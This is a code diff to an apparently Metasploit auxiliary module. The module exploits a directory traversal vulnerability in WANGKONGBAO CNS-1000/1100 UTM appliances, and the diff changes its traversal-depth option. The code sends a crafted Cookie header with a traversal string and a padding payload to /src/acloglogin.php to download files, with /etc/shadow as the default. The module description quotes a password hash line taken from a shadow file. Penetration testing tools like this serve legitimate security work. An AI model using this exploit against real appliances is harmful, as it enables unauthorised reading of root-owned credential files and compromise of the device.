@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Auxiliary
 					This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka
 				Network Security Platform. This directory traversal vulnerability is interesting
 				because the apache server is running as root, this means we can grab anything we
-				want! For instance, the /etc/shadow and /etc/passwd files for the special 
+				want! For instance, the /etc/shadow and /etc/passwd files for the special
 				kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user
 			},
 			'References'     =>
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(85),
 				OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
-				OptString.new('DIRTRAVS', [true, 'Traversal depth', '../../../../../../../../../..'])
+				OptInt.new('DEPTH', [true, 'Traversal depth', 10])
 			], self.class)
 	end
 
@@ -49,6 +49,8 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
+		travs = "../" * datastore['DEPTH']
+
 		# Create request
 		path = "/src/acloglogin.php"
 		res = send_request_raw({
@@ -58,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 				{
 					'Connection' => "keep-alive",
 					'Accept-Encoding' => "zip,deflate",
-					'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + datastore['DIRTRAVS'] + datastore['FILEPATH'] + "/."*4043
+					'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + travs + datastore['FILEPATH'] + "/."*4043
 				},
 		}, 25)
 
